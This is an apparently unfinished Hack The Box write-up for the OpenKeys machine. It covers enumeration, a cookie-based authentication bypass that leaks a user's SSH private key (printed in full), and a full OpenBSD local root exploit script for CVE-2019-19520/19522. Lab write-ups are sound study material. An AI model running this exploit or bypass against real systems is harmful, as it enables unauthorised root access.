# HTB - OpenKeys

## Overview

![](<machine>.infocard.png)

Short description to include any strange things to be dealt with

## Useful Skills and Tools

#### Useful thing 1

- description with generic example

#### Useful thing 2

- description with generic example

## Enumeration

### Nmap scan

I started my enumeration with an nmap scan of `10.10.10.199`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.

```
┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ nmap -p- -sCV -n -v -oA openkeys 10.10.10.199                                                 130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-12 18:53 EST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:53
Completed NSE at 18:53, 0.00s elapsed
Initiating NSE at 18:53
Completed NSE at 18:53, 0.00s elapsed
Initiating NSE at 18:53
Completed NSE at 18:53, 0.00s elapsed
Initiating Ping Scan at 18:53
Scanning 10.10.10.199 [2 ports]
Completed Ping Scan at 18:53, 0.03s elapsed (1 total hosts)
Initiating Connect Scan at 18:53
Scanning 10.10.10.199 [65535 ports]
Discovered open port 22/tcp on 10.10.10.199
Discovered open port 80/tcp on 10.10.10.199
Increasing send delay for 10.10.10.199 from 0 to 5 due to 68 out of 225 dropped probes since last increase.
Increasing send delay for 10.10.10.199 from 5 to 10 due to max_successful_tryno increase to 4
Connect Scan Timing: About 4.19% done; ETC: 19:06 (0:11:48 remaining)
Connect Scan Timing: About 8.50% done; ETC: 19:05 (0:10:56 remaining)
Connect Scan Timing: About 12.80% done; ETC: 19:05 (0:10:20 remaining)
Connect Scan Timing: About 17.90% done; ETC: 19:05 (0:09:42 remaining)
Connect Scan Timing: About 22.98% done; ETC: 19:05 (0:09:06 remaining)
Connect Scan Timing: About 28.07% done; ETC: 19:05 (0:08:30 remaining)
Connect Scan Timing: About 33.52% done; ETC: 19:05 (0:07:52 remaining)
Connect Scan Timing: About 38.64% done; ETC: 19:05 (0:07:15 remaining)
Connect Scan Timing: About 43.79% done; ETC: 19:05 (0:06:38 remaining)
Connect Scan Timing: About 48.91% done; ETC: 19:05 (0:06:01 remaining)
Connect Scan Timing: About 54.02% done; ETC: 19:05 (0:05:25 remaining)
Connect Scan Timing: About 59.14% done; ETC: 19:05 (0:04:49 remaining)
Connect Scan Timing: About 64.25% done; ETC: 19:05 (0:04:13 remaining)
Connect Scan Timing: About 69.36% done; ETC: 19:05 (0:03:36 remaining)
Connect Scan Timing: About 74.43% done; ETC: 19:05 (0:03:01 remaining)
Connect Scan Timing: About 79.48% done; ETC: 19:05 (0:02:25 remaining)
Connect Scan Timing: About 84.53% done; ETC: 19:05 (0:01:49 remaining)
Connect Scan Timing: About 89.63% done; ETC: 19:05 (0:01:13 remaining)
Connect Scan Timing: About 94.69% done; ETC: 19:05 (0:00:38 remaining)
Completed Connect Scan at 19:05, 708.43s elapsed (65535 total ports)
Initiating Service scan at 19:05
Scanning 2 services on 10.10.10.199
Completed Service scan at 19:05, 6.17s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.199.
Initiating NSE at 19:05
Completed NSE at 19:05, 2.15s elapsed
Initiating NSE at 19:05
Completed NSE at 19:05, 0.15s elapsed
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Nmap scan report for 10.10.10.199
Host is up (0.042s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).

NSE: Script Post-scanning.
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Initiating NSE at 19:05
Completed NSE at 19:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 717.23 seconds
```

Only two ports open, 22 - SSH and 80 - HTTP

HTTP leads to login page

```
┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ gobuster dir -u http://10.10.10.199 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.199
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/12 19:16:49 Starting gobuster
===============================================================
/images (Status: 301)
/js (Status: 301)
/includes (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/vendor (Status: 301)
[ERROR] 2020/11/12 19:20:04 [!] parse http://10.10.10.199/error_log: net/url: invalid control character in URL
===============================================================
2020/11/12 19:20:59 Finished
===============================================================
```

There wasn't anything to do with the login page so I ran gobuster on it, there was am /includes folder; downloaded auth.php and auth.php.swp

found potential username jennifer in swap file

.swp file is a vim recovery file, can get the file contents back from:
https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file

```
┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ vim -r auth.php.swp
```

```php
<?php

function authenticate($username, $password)
{
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
    system($cmd, $retcode);
    return $retcode;
}

function is_active_session()
{
    // Session timeout in seconds
    $session_timeout = 300;

    // Start the session
    session_start();

    // Is the user logged in? 
    if(isset($_SESSION["logged_in"]))
    {
        // Has the session expired?
        $time = $_SERVER['REQUEST_TIME'];
        if (isset($_SESSION['last_activity']) &&
            ($time - $_SESSION['last_activity']) > $session_timeout)
        {
            close_session();
            return False;
        }
        else
        {
            // Session is active, update last activity time and return True
            $_SESSION['last_activity'] = $time;
            return True;
        }
    }
    else
    {
        return False;
    }
}

```

escapeshellcmd ../auth_helpers/check_auth

```
┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ file check_auth                      
check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
```

googled `/usr/libexec/ld.so` - https://man.netbsd.org/libexec/ld.so.1

found exploit for this file on openbsd - https://www.exploit-db.com/exploits/47780 

> yields full root privileges.

Will have to remember this one when I gain access to the machine

```
┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ strings check_auth           
/usr/libexec/ld.so
OpenBSD
libc.so.95.1
_csu_finish
exit
_Jv_RegisterClasses
atexit
auth_userokay
_end
AWAVAUATSH
t-E1
t7E1
ASAWAVAT
A\A^A_A[]
ASAWAVP
A^A_A[]L3
Linker: LLD 8.0.1
.interp
.note.openbsd.ident
.dynsym
.gnu.hash
.hash
.dynstr
.rela.dyn
.rela.plt
.eh_frame_hdr
.eh_frame
.text
.init
.fini
.plt
.data
.openbsd.randomdata
.jcr
.ctors
.dtors
.dynamic
.got
.got.plt
.bss
.comment
.symtab
.shstrtab
.strtab
crt0.c
___start
crtbegin.c
__CTOR_LIST__
__DTOR_LIST__
__EH_FRAME_BEGIN__
__JCR_LIST__
__do_fini
__do_fini.finalized
__do_init
__do_init.initialized
__do_init.object
test.c
crtend.c
__csu_do_fini_array
__init
__init_array_end
__init_array_start
__llvm_retpoline_r11
__preinit_array_end
__preinit_array_start
__retguard_1205
__start
_csu_finish
_start
exit
main
_Jv_RegisterClasses
__dso_handle
__fini
__fini_array_end
__fini_array_start
__guard_local
__register_frame_info
__retguard_1471
__retguard_1773
__retguard_2473
atexit
_GLOBAL_OFFSET_TABLE_
auth_userokay
_end
_DYNAMIC
```

OpenBSD, /usr/libexec/ld.so, libc.so.95.1 looked like places to start investigating

https://blog.firosolutions.com/exploits/cve-2019-19521-openbsd-libc-2019/


```
┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ ssh -v -F /dev/null -o PreferredAuthentications=keyboard-interactive -o KbdInteractiveDevices=bsdauth -l -sresponse:passwd 10.10.10.199
OpenSSH_8.3p1 Debian-1, OpenSSL 1.1.1g  21 Apr 2020
debug1: Reading configuration data /dev/null
debug1: Connecting to 10.10.10.199 [10.10.10.199] port 22.
debug1: Connection established.
...snipped...
debug1: Remote protocol version 2.0, remote software version OpenSSH_8.1
debug1: match: OpenSSH_8.1 pat OpenSSH* compat 0x04000000
debug1: Authenticating to 10.10.10.199:22 as '-sresponse:passwd'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: curve25519-sha256
debug1: kex: host key algorithm: ecdsa-sha2-nistp256
debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
debug1: Server host key: ecdsa-sha2-nistp256 SHA256:gzhq4BokiWZ1NNWrblA8w3hLOhlhoRy+NFyi2smBZOA
The authenticity of host '10.10.10.199 (10.10.10.199)' can't be established.
ECDSA key fingerprint is SHA256:gzhq4BokiWZ1NNWrblA8w3hLOhlhoRy+NFyi2smBZOA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.199' (ECDSA) to the list of known hosts.
debug1: rekey out after 134217728 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 134217728 blocks
...snipped...
debug1: SSH2_MSG_EXT_INFO received
debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521>
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: keyboard-interactive
Connection closed by 10.10.10.199 port 22
```

https://packetstormsecurity.com/files/155572/Qualys-Security-Advisory-OpenBSD-Authentication-Bypass-Privilege-Escalation.html

So the system was vulnerable, but I was still not sure how to exploit this to gain access

## Initial Foothold

## Road to User

### Further enumeration

### Finding user creds


pics above

after seeing that it said no key specified for that user, I tried multiple ways of specifying the only username I had found.  I was able to give the name in the cookie and get a response back!

```
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: close
Content-type: text/html; charset=UTF-8
Date: Fri, 13 Nov 2020 01:55:44 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Server: OpenBSD httpd
X-Powered-By: PHP/7.3.13
Content-Length: 3093

<!DOCTYPE html>


<html><head><title>OpenKeyS - Retrieve your OpenSSH Keys</title></head><body><div><h3>OpenSSH key for user jennifer</h3><p style='font-family: monospace, monospace;'>-----BEGIN OPENSSH PRIVATE KEY-----<br />
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn<br />
NhAAAAAwEAAQAAAYEAo4LwXsnKH6jzcmIKSlePCo/2YWklHnGn50YeINLm7LqVMDJJnbNx<br />
OI6lTsb9qpn0zhehBS2RCx/i6YNWpmBBPCy6s2CxsYSiRd3S7NftPNKanTTQFKfOpEn7rG<br />
nag+n7Ke+iZ1U/FEw4yNwHrrEI2pklGagQjnZgZUADzxVArjN5RsAPYE50mpVB7JO8E7DR<br />
PWCfMNZYd7uIFBVRrQKgM/n087fUyEyFZGibq8BRLNNwUYidkJOmgKSFoSOa9+6B0ou5oU<br />
qjP7fp0kpsJ/XM1gsDR/75lxegO22PPfz15ZC04APKFlLJo1ZEtozcmBDxdODJ3iTXj8Js<br />
kLV+lnJAMInjK3TOoj9F4cZ5WTk29v/c7aExv9zQYZ+sHdoZtLy27JobZJli/9veIp8hBG<br />
717QzQxMmKpvnlc76HLigzqmNoq4UxSZlhYRclBUs3l5CU9pdsCb3U1tVSFZPNvQgNO2JD<br />
S7O6sUJFu6mXiolTmt9eF+8SvEdZDHXvAqqvXqBRAAAFmKm8m76pvJu+AAAAB3NzaC1yc2<br />
EAAAGBAKOC8F7Jyh+o83JiCkpXjwqP9mFpJR5xp+dGHiDS5uy6lTAySZ2zcTiOpU7G/aqZ<br />
9M4XoQUtkQsf4umDVqZgQTwsurNgsbGEokXd0uzX7TzSmp000BSnzqRJ+6xp2oPp+ynvom<br />
dVPxRMOMjcB66xCNqZJRmoEI52YGVAA88VQK4zeUbAD2BOdJqVQeyTvBOw0T1gnzDWWHe7<br />
iBQVUa0CoDP59PO31MhMhWRom6vAUSzTcFGInZCTpoCkhaEjmvfugdKLuaFKoz+36dJKbC<br />
f1zNYLA0f++ZcXoDttjz389eWQtOADyhZSyaNWRLaM3JgQ8XTgyd4k14/CbJC1fpZyQDCJ<br />
4yt0zqI/ReHGeVk5Nvb/3O2hMb/c0GGfrB3aGbS8tuyaG2SZYv/b3iKfIQRu9e0M0MTJiq<br />
b55XO+hy4oM6pjaKuFMUmZYWEXJQVLN5eQlPaXbAm91NbVUhWTzb0IDTtiQ0uzurFCRbup<br />
l4qJU5rfXhfvErxHWQx17wKqr16gUQAAAAMBAAEAAAGBAJjT/uUpyIDVAk5L8oBP3IOr0U<br />
Z051vQMXZKJEjbtzlWn7C/n+0FVnLdaQb7mQcHBThH/5l+YI48THOj7a5uUyryR8L3Qr7A<br />
UIfq8IWswLHTyu3a+g4EVnFaMSCSg8o+PSKSN4JLvDy1jXG3rnqKP9NJxtJ3MpplbG3Wan<br />
j4zU7FD7qgMv759aSykz6TSvxAjSHIGKKmBWRL5MGYt5F03dYW7+uITBq24wrZd38NrxGt<br />
wtKCVXtXdg3ROJFHXUYVJsX09Yv5tH5dxs93Re0HoDSLZuQyIc5iDHnR4CT+0QEX14u3EL<br />
TxaoqT6GBtynwP7Z79s9G5VAF46deQW6jEtc6akIbcyEzU9T3YjrZ2rAaECkJo4+ppjiJp<br />
NmDe8LSyaXKDIvC8lb3b5oixFZAvkGIvnIHhgRGv/+pHTqo9dDDd+utlIzGPBXsTRYG2Vz<br />
j7Zl0cYleUzPXdsf5deSpoXY7axwlyEkAXvavFVjU1UgZ8uIqu8W1BiODbcOK8jMgDkQAA<br />
AMB0rxI03D/q8PzTgKml88XoxhqokLqIgevkfL/IK4z8728r+3jLqfbR9mE3Vr4tPjfgOq<br />
eaCUkHTiEo6Z3TnkpbTVmhQbCExRdOvxPfPYyvI7r5wxkTEgVXJTuaoUJtJYJJH2n6bgB3<br />
WIQfNilqAesxeiM4MOmKEQcHiGNHbbVW+ehuSdfDmZZb0qQkPZK3KH2ioOaXCNA0h+FC+g<br />
dhqTJhv2vl1X/Jy/assyr80KFC9Eo1DTah2TLnJZJpuJjENS4AAADBAM0xIVEJZWEdWGOg<br />
G1vwKHWBI9iNSdxn1c+SHIuGNm6RTrrxuDljYWaV0VBn4cmpswBcJ2O+AOLKZvnMJlmWKy<br />
Dlq6MFiEIyVKqjv0pDM3C2EaAA38szMKGC+Q0Mky6xvyMqDn6hqI2Y7UNFtCj1b/aLI8cB<br />
rfBeN4sCM8c/gk+QWYIMAsSWjOyNIBjy+wPHjd1lDEpo2DqYfmE8MjpGOtMeJjP2pcyWF6<br />
CxcVbm6skasewcJa4Bhj/MrJJ+KjpIjQAAAMEAy/+8Z+EM0lHgraAXbmmyUYDV3uaCT6ku<br />
Alz0bhIR2/CSkWLHF46Y1FkYCxlJWgnn6Vw43M0yqn2qIxuZZ32dw1kCwW4UNphyAQT1t5<br />
eXBJSsuum8VUW5oOVVaZb1clU/0y5nrjbbqlPfo5EVWu/oE3gBmSPfbMKuh9nwsKJ2fi0P<br />
bp1ZxZvcghw2DwmKpxc+wWvIUQp8NEe6H334hC0EAXalOgmJwLXNPZ+nV6pri4qLEM6mcT<br />
qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=<br />
-----END OPENSSH PRIVATE KEY-----</p><a href='index.php'>Back to login page</a></div></body></html>
```

The service gave me an SSH key for the user `jennifer`!

```
┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ ssh jennifer@10.10.10.199 -i jennifer.key 
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'jennifer.key' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "jennifer.key": bad permissions
jennifer@10.10.10.199's password:                                                                    
┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ chmod 600 jennifer.key 

┌──(zweilos㉿kali)-[~/htb/openkeys]
└─$ ssh jennifer@10.10.10.199 -i jennifer.key
Last login: Thu Nov 12 17:47:14 2020 from 10.10.14.223
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$ id && hostname
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
openkeys.htb
openkeys$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
And you call yourself a Rocket Scientist!
```

Instead of telling me failed password attempt, the machine taunted me, saying "And you call yourself a Rocket Scientist!".

### User.txt

```
openkeys$ ls -la
total 112
drwxr-xr-x  3 jennifer  jennifer    512 Nov 13 01:30 .
drwxr-xr-x  3 root      wheel       512 Jan 13  2020 ..
-rw-r--r--  1 jennifer  jennifer     87 Jan 13  2020 .Xdefaults
-rw-r--r--  1 jennifer  jennifer    771 Jan 13  2020 .cshrc
-rw-r--r--  1 jennifer  jennifer    101 Jan 13  2020 .cvsrc
-rw-r--r--  1 jennifer  jennifer    359 Jan 13  2020 .login
-rw-r--r--  1 jennifer  jennifer    175 Jan 13  2020 .mailrc
-rw-r--r--  1 jennifer  jennifer    215 Jan 13  2020 .profile
drwx------  2 jennifer  jennifer    512 Jan 13  2020 .ssh
-rw-r--r--  1 root      jennifer    277 Nov 12 09:00 dead.letter
-rwxr-xr-x  1 jennifer  jennifer   4087 Nov 12 09:39 exploit.sh
-rwxr-xr-x  1 jennifer  jennifer  10736 Nov 12 08:58 poc
-rw-r--r--  1 jennifer  jennifer    602 Nov 12 08:58 poc.c
-rwxr-xr-x  1 jennifer  jennifer  14768 Nov 12 17:55 swrast_dri.so
-rw-r-----  1 jennifer  jennifer     33 Jan 14  2020 user.txt
openkeys$ cat user.txt                                                                                
36ab21239a15c537bde90626891d2b10
```

`jennifer` had the user.txt flag in the user's folder

## Path to Power \(Gaining Administrator Access\)

### Enumeration as User <username>

```
openkeys$ su -L -- -schallenge
Segmentation fault
```

the file dead-letter contained

```
Date: Thu, 12 Nov 2020 09:00:44 +0000 (UTC)
To: root
From: jennifer
Auto-Submitted: auto-generated
Subject: *** SECURITY information for openkeys.htb ***

openkeys.htb : Nov 12 09:00:44 : jennifer : user NOT in sudoers ; TTY=ttyp0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/ps -a
```

```
openkeys$ cat /etc/sudoers
# $OpenBSD: sudoers,v 1.1.1.1 2015/06/22 15:52:16 millert Exp $
#
# sudoers file.
#
# This file MUST be edited with the 'visudo' command as root.
# Failure to use 'visudo' may result in syntax or file permission errors
# that prevent sudo from running.
#
# See the sudoers man page for the details on how to write a sudoers file.
#

# Host alias specification

# User alias specification

# Cmnd alias specification

# Defaults specification
Defaults env_keep +="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

# Non-exhaustive list of variables needed to build release(8) and ports(7)
Defaults:%wsrc env_keep +="DESTDIR DISTDIR FETCH_CMD FLAVOR GROUP MAKE MAKECONF"
Defaults:%wsrc env_keep +="MULTI_PACKAGES NOMAN OKAY_FILES OWNER PKG_DBDIR"
Defaults:%wsrc env_keep +="PKG_DESTDIR PKG_TMPDIR PORTSDIR RELEASEDIR SHARED_ONLY"
Defaults:%wsrc env_keep +="SUBPACKAGE WRKOBJDIR SUDO_PORT_V1"

# Uncomment to preserve the default proxy host variable
#Defaults env_keep +="ftp_proxy http_proxy"

# Uncomment to disable the lecture the first time you run sudo
#Defaults !lecture

# Uncomment to preserve the environment for users in group wheel
#Defaults:%wheel !env_reset

# Runas alias specification

# User privilege specification
root    ALL=(ALL) SETENV: ALL

# Uncomment to allow people in group wheel to run all commands
# and set environment variables.
# %wheel        ALL=(ALL) SETENV: ALL

# Same thing without a password
# %wheel        ALL=(ALL) NOPASSWD: SETENV: ALL

# Samples
# %users  ALL=/sbin/mount /cdrom,/sbin/umount /cdrom
# %users  localhost=/sbin/shutdown -h now

www     ALL=(jennifer) NOPASSWD: /usr/local/otp/skey_gen
```

In the /etc/sudoers file there was an intereseting entry that let www run the `skey_gen` command as jennifer; too bad the wheel group was commented out...

### Getting a shell


```
openkeys$ uname -a
OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
```

Version is OpenBSD 6.6 x64

searching for root exploit for this led to https://github.com/bcoles/local-exploits/blob/master/CVE-2019-19520/openbsd-authroot

```
#!/bin/sh
# openbsd-authroot - OpenBSD local root exploit for CVE-2019-19520 and CVE-2019-19522
# Code mostly stolen from Qualys PoCs:
# - https://www.openwall.com/lists/oss-security/2019/12/04/5
#
# Uses CVE-2019-19520 to gain 'auth' group permissions via xlock;
# and CVE-2019-19520 to gain root permissions via S/Key or YubiKey
# (requires S/Key or YubiKey authentication to be enabled).
# ---
# $ ./openbsd-authroot
# openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
# [*] checking system ...
# [*] system supports YubiKey authentication
# [*] id: uid=1002(test) gid=1002(test) groups=1002(test)
# [*] compiling ...
# [*] running Xvfb ...
# [*] testing for CVE-2019-19520 ...
# (EE) 
# Fatal server error:
# (EE) Server is already active for display 66
#         If this server is no longer running, remove /tmp/.X66-lock
#         and start again.
# (EE) 
# [+] success! we have auth group permissions
#
# WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).
#
# [*] trying CVE-2019-19522 (YubiKey) ...
# Your password is: krkhgtuhdnjclrikikklulkldlutreul
# Password:
# ksh: /etc/profile[2]: source: not found
# # id                                                                                                                                                                                    
# uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
# ---
# 2019-12-06 - <bcoles@gmail.com>
# https://github.com/bcoles/local-exploits/tree/master/CVE-2019-19520

echo "openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)"

echo "[*] checking system ..."

if grep auth= /etc/login.conf | fgrep -Ev "^#" | grep -q yubikey ; then
  echo "[*] system supports YubiKey authentication"
  target='yubikey'
elif grep auth= /etc/login.conf | fgrep -Ev "^#" | grep -q skey ; then
  echo "[*] system supports S/Key authentication"
  target='skey'
  if ! test -d /etc/skey/ ; then
    echo "[-] S/Key authentication enabled, but has not been initialized"
    exit 1
  fi
else
  echo "[-] system does not support S/Key / YubiKey authentication"
  exit 1
fi

echo "[*] id: `id`"

echo "[*] compiling ..."

cat > swrast_dri.c << "EOF"
#include <paths.h>
#include <sys/types.h>
#include <unistd.h>
static void __attribute__ ((constructor)) _init (void) {
    gid_t rgid, egid, sgid;
    if (getresgid(&rgid, &egid, &sgid) != 0) _exit(__LINE__);
    if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
    char * const argv[] = { _PATH_KSHELL, NULL };
    execve(argv[0], argv, NULL);
    _exit(__LINE__);
}
EOF

cc -fpic -shared -s -o swrast_dri.so swrast_dri.c
rm -rf swrast_dri.c

echo "[*] running Xvfb ..."

display=":66"

env -i /usr/X11R6/bin/Xvfb $display -cc 0 &

echo "[*] testing for CVE-2019-19520 ..."

group=$(echo id -gn | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display)

if [ "$group" = "auth" ]; then
  echo "[+] success! we have auth group permissions"
else
  echo "[-] failed to acquire auth group permissions"
  exit 1
fi

# uncomment to drop to a shell with auth group permissions
#env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display ; exit

echo
echo "WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C)."
echo
sleep 5

if [ "$target" = "skey" ]; then
  echo "[*] trying CVE-2019-19522 (S/Key) ..."
  echo "rm -rf /etc/skey/root ; echo 'root md5 0100 obsd91335 8b6d96e0ef1b1c21' > /etc/skey/root ; chmod 0600 /etc/skey/root" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display
  rm -rf swrast_dri.so
  echo "Your password is: EGG LARD GROW HOG DRAG LAIN"
  env -i TERM=vt220 su -l -a skey
fi

if [ "$target" = "yubikey" ]; then
  echo "[*] trying CVE-2019-19522 (YubiKey) ..."
  echo "rm -rf /var/db/yubikey/root.* ; echo 32d32ddfb7d5 > /var/db/yubikey/root.uid ; echo 554d5eedfd75fb96cc74d52609505216 > /var/db/yubikey/root.key" | env -i LIBGL_DRIVERS_PATH=. /usr/X11R6/bin/xlock -display $display
  rm -rf swrast_dri.so
  echo "Your password is: krkhgtuhdnjclrikikklulkldlutreul"
  env -i TERM=vt220 su -l -a yubikey
fi
```

The exploit was a shell script that I wrote to a file.  It didn't seem to need any configuring so I ran it to see what it would do.

How this exploit works:

```
openkeys# cat /etc/login.conf
# $OpenBSD: login.conf,v 1.12 2019/08/19 20:59:14 naddy Exp $

#
# Sample login.conf file.  See login.conf(5) for details.
#

#
# Standard authentication styles:
#
# passwd        Use only the local password file
# chpass        Do not authenticate, but change user's password (change
#               the YP password if the user has one, else change the
#               local password)
# lchpass       Do not login; change user's local password instead
# radius        Use radius authentication
# reject        Use rejected authentication
# skey          Use S/Key authentication
# activ         ActivCard X9.9 token authentication
# crypto        CRYPTOCard X9.9 token authentication
# snk           Digital Pathways SecureNet Key authentication
# tis           TIS Firewall Toolkit authentication
# token         Generic X9.9 token authentication
# yubikey       YubiKey authentication
#

# Default allowed authentication styles
auth-defaults:auth=passwd,skey:
#auth-defaults:auth=passwd:

# Default allowed authentication styles for authentication type ftp
auth-ftp-defaults:auth-ftp=skey:

#
# The default values
# To alter the default authentication types change the line:
#       :tc=auth-defaults:\
# to read something like: (enables passwd, "myauth", and activ)
#       :auth=passwd,myauth,activ:\
# Any value changed in the daemon class should be reset in default
# class.
#
default:\
        :path=/usr/bin /bin /usr/sbin /sbin /usr/X11R6/bin /usr/local/bin /usr/local/sbin:\
        :umask=022:\
        :datasize-max=768M:\
        :datasize-cur=768M:\
        :maxproc-max=256:\
        :maxproc-cur=128:\
        :openfiles-max=1024:\
        :openfiles-cur=512:\
        :stacksize-cur=4M:\
        :localcipher=blowfish,a:\
        :tc=auth-defaults:\
        :tc=auth-ftp-defaults:

#
# Settings used by /etc/rc and root
# This must be set properly for daemons started as root by inetd as well.
# Be sure to reset these values to system defaults in the default class!
#
daemon:\
        :ignorenologin:\
        :datasize=infinity:\
        :maxproc=infinity:\
        :openfiles-max=1024:\
        :openfiles-cur=128:\
        :stacksize-cur=8M:\
        :localcipher=blowfish,a:\
        :tc=default:

#
# Staff have fewer restrictions and can login even when nologins are set.
#
staff:\
        :datasize-cur=1536M:\
        :datasize-max=infinity:\
        :maxproc-max=512:\
        :maxproc-cur=256:\
        :ignorenologin:\
        :requirehome@:\
        :tc=default:

#
# Authpf accounts get a special motd and shell
#
authpf:\
        :welcome=/etc/motd.authpf:\
        :shell=/usr/sbin/authpf:\
        :tc=default:

#
# Building ports with DPB uses raised limits
#
pbuild:\
        :datasize-max=infinity:\
        :datasize-cur=6144M:\
        :maxproc-max=1024:\
        :maxproc-cur=384:\
        :tc=default:

#
# Override resource limits for certain daemons started by rc.d(8)
#
bgpd:\
        :openfiles=512:\
        :tc=daemon:

unbound:\
        :openfiles=512:\
        :tc=daemon:
```

The relevant lines are:

```
# Default allowed authentication styles
auth-defaults:auth=passwd,skey:
#auth-defaults:auth=passwd:

# Default allowed authentication styles for authentication type ftp
auth-ftp-defaults:auth-ftp=skey:
```

Can use BSD's skey to login. 


> https://man.openbsd.org/skey.1
> S/Key is a procedure for using one-time passwords to authenticate access to computer systems. It uses 64 bits of information transformed by the MD5, RIPEMD-160, or SHA1 algorithms. The user supplies the 64 bits in the form of 6 English words that are generated by a secure computer. This implementation of S/Key is RFC 2289 compliant.

> Before using skey the system needs to be initialized using skeyinit(1); this will establish a secret passphrase. After that, one-time passwords can be generated using skey, which will prompt for the secret passphrase. After a one-time password has been used to log in, it can no longer be used.

> When skey is invoked as otp-method, skey will use method as the hash function where method is currently one of md5, rmd160, or sha1.

> If you misspell your secret passphrase while running skey, you will get a list of one-time passwords that will not work, and no indication of the problem.

